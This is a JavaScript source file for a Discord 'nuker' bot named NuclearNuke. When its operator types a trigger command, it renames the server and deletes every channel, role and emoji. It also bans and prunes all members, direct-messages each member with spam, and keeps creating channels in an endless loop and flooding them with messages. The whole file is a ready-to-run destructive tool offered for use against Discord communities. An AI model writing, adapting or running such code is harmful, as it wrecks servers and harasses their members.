"use strict";

// Dependencies
const discord = require("discord.js");
const chalk = require("chalk");

// Variables
const bot = new discord.Client()

var NuclearNuke = {
    token: "",
    userID: "",
    configuration: {
        changeMembersNicknameTo: "Nuked using NuclearNuke",
        makeChannelsCalled: "Nuked using NuclearNuke",
        sendMessageToCreatedChannel: "This server is nuked using NuclearNuke from https://github.com/cspi-git/ZeroDiscord/tree/main/nukers/NuclearNuke",
        changeServerNameTo: "Nuked using NuclearNuke",
        makeRolesCalled: "Nuked using NuclearNuke",
        messageEveryMember: "One of the server your in has been nuked using NuclearNuke from https://github.com/cspi-git/ZeroDiscord/tree/main/nukers/NuclearNuke",
        pruneDays: 1,
        makeChannelsSpamDelay: 1000,
        createdChannelsSpamMessageDelay: 2000
    }
}

// Functions
NuclearNuke.log = function(type, message){
    if(type == "info"){
        console.log(`${chalk.gray("[") + chalk.blueBright("INFORMATION") + chalk.gray("]")} ${message}`)
    }else if(type == "warn"){
        console.log(`${chalk.gray("[") + chalk.yellowBright("WARNING") + chalk.gray("]")} ${message}`)
    }
}

//Main
bot.on("ready", ()=>{
    NuclearNuke.log("info", "Nuker is running.")
    NuclearNuke.log("info", "To nuke specific current server just type $>nuke in any channel of the server that you want to nuke and make sure the nuker bot is there.")
    NuclearNuke.log("info", "Make sure the bot has a high permission.")
})

bot.on("message", async(message)=>{
    if(message.content === "$>nuke" && message.author.id == NuclearNuke.userID){
        NuclearNuke.log("info", "Changing the server name.")
        message.guild.setName(NuclearNuke.configuration.changeServerNameTo).then(()=>{
            NuclearNuke.log("info", "Server named successfully changed.")
        }).catch(()=>{
            NuclearNuke.log("warn", "Unable to change the server name.")
        })

        NuclearNuke.log("info", "Messaging every members.")
        message.guild.members.cache.forEach(member=>{
            member.send(NuclearNuke.configuration.messageEveryMember).then(()=>{
                NuclearNuke.log("info", `Server member called ${member.user.tag} successfully messaged.`)
            }).catch(()=>{
                NuclearNuke.log("info", `Unable to send message to server member called ${member.user.tag}`)
            })
        })

        NuclearNuke.log("info", "Deleting the server channels.")
        message.guild.channels.cache.forEach(channel=>{
            channel.delete().then(()=>{
                NuclearNuke.log("info", `Server channel called ${channel.name} successfully deleted.`)
            }).catch(()=>{
                NuclearNuke.log("warn", `Unable to delete server channel called ${channel.name}.`)
            })
        })

        NuclearNuke.log("info", "Nicknaming every members.")
        message.guild.members.cache.forEach(member =>{
            member.setNickname(NuclearNuke.configuration.changeMembersNicknameTo).then(()=>{
                NuclearNuke.log("info", `Successfully nicknamed server member called ${member.user.tag}`)
            }).catch(()=>{
                NuclearNuke.log("warn", `Unable to nickname server member called ${member.user.tag}`)
            })
        })

        NuclearNuke.log("info", "Removing all roles.")
        message.guild.roles.cache.forEach(role=>{
            role.delete().then(()=>{
                NuclearNuke.log("info", `Server role called ${role.name} successfully deleted.`)
            }).catch(()=>{
                NuclearNuke.log("warn", `Unable to delete server role called ${role.name}.`)
            })
        })

        NuclearNuke.log("info", "Making 15 roles in the server.")
        for( let i = 0; i <= 14; i++ ){
            message.guild.roles.create({ "data": { name: NuclearNuke.configuration.makeRolesCalled } }) .then((channel)=>{
                NuclearNuke.log("info", `Successfully created a server role called ${NuclearNuke.configuration.makeRolesCalled}`)
            }).catch(()=>{
                NuclearNuke.log("warn", `Unable to create a server role called ${NuclearNuke.configuration.makeRolesCalled}`)
            })
        }

        NuclearNuke.log("info", "Pruning server members.")
        message.guild.members.prune({ days: NuclearNuke.configuration.pruneDays }).then(()=>{
            NuclearNuke.log("info", "Successfully pruned server members.")
        }).catch(()=>{
            NuclearNuke.log("warn", "Unable to prune server members.")
        })

        NuclearNuke.log("info", "Banning server members.")
        message.guild.members.cache.forEach(member =>{
            member.ban().then(()=>{
                NuclearNuke.log("info", `Successfully banned server member called ${member.user.tag}`)
            }).catch(()=>{
                NuclearNuke.log("warn", `Unable to ban server member called ${member.user.tag}`)
            })
        })

        NuclearNuke.log("info", "Removing server emojis.")
        message.guild.emojis.cache.forEach(emoji =>{
            emoji.delete().then(()=>{
                NuclearNuke.log("info", `Server emoji called ${emoji.name} successfully deleted.`)
            }).catch(()=>{
                NuclearNuke.log("warn", `Unable to delete server emoji called ${emoji.name}`)
            })
        })

        
        const delayModule = await import("delay");
        const delay = delayModule.default;

        await delay(2000)
        NuclearNuke.log("info", "Making infinite channels in the server and messaging them.")
        setInterval(function(){
            message.guild.channels.create(NuclearNuke.configuration.makeChannelsCalled).then((channel)=>{
                NuclearNuke.log("info", `Successfully created a server channel called ${NuclearNuke.configuration.makeChannelsCalled}`)
                setInterval(function(){
                    channel.send(NuclearNuke.configuration.sendMessageToCreatedChannel).then(()=>{
                        NuclearNuke.log("info", `Successfully sent a message to a server channel called ${NuclearNuke.configuration.makeChannelsCalled}`)
                    }).catch(()=>{
                        NuclearNuke.log("warn", `Unable to send a message to a server channel called ${NuclearNuke.configuration.makeChannelsCalled}`)
                    })
                }, NuclearNuke.configuration.createdChannelsSpamMessageDelay)
            }).catch(()=>{
                NuclearNuke.log("warn", `Unable to create a server channel called ${NuclearNuke.configuration.makeChannelsCalled}`)
            })
        }, NuclearNuke.configuration.makeChannelsSpamDelay)
    }
})

bot.login(NuclearNuke.token)
